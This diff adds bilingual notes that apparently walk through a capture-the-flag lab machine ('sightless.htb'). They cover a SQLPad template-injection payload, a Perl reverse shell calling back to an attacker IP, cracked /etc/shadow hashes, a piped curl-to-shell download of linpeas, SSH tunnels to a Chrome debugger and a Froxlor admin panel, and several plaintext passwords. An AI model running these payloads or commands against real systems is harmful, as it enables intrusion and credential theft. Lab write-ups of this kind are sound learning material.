@@ -1,0 +1,51 @@
+Exploit on the sqlpad containers:
+{{ process.mainModule.require('child_process').exec('ls -a >/etc/pwn') }}
+
+Reverse Shell payload (we use a poc on the CVE with a python tool):
+{{ process.mainModule.require('child_process').exec('perl -e 'use Socket;$i="10.10.14.76";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}') }}
+
+Find ssh passwords in /etc/shadow:
+root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.
+michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
+
+Use of hashcat to crack the passwords:
+hashcat -m 1800 -a 0 hashes.txt ../../rockyou.txt
+root:blindside
+michael:insaneclownposse
+
+Connect to michael:
+ssh michael@10.10.11.32
+michael:insaneclownposse
+
+Use linpeas to know potential privilege escalation vulnerabilities:
+host: sudo python3 -m http.server 80 (linpeas.sh à la racine)
+victim: curl HOST_IP/linpeas.sh | sh
+
+Processus chrome utilisant le remote debugger:
+john        1648  0.6  2.8 34011320 112136 ?     Sl   12:51   0:23 /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection
+ --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --lo
+g-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chrom
+ium.1rz2bu data:,
+
+Le port 36456 est utilisé pour le service remote debuger
+
+On peut se connecter en ssh à la machine en créant un tunnel entre localhost:12345 et IP:36456 pour voir le debuger dans notre machine locale
+
+ssh -L 12345:127.0.0.1:xxxxx michael@10.10.11.32
+
+
+Ensuite on peut dump les cookies à partir de là et les pages Froxor et admin
+
+On peut faire un port forwarding depuis un port de chez nous vers un port de la machine distante pour accéder à admin.sightless.htb:8080 qui était sur le port 8080
+
+ssh -L 8080:127.0.0.1:8080 michael@10.10.11.32
+
+A l'aide de ce port forwarding on peut maintenant query http://admin.sightless.htb:8080 et on obtient la page de connexion admin de l'interface Froxlor du système.
+
+Pour obtenir les credentials on va utiliser le chrome remote debugger et intercepter la requête de connexion sur cette page.
+
+admin:ForlorfroxAdmin
+
+Un fois sur l'interface Froxlor, on peut utiliser PHP-FPM pour écraser une config
+login admin: txlast:kevBKcixyp
+login customer: txlastc:dcsenpLIvh
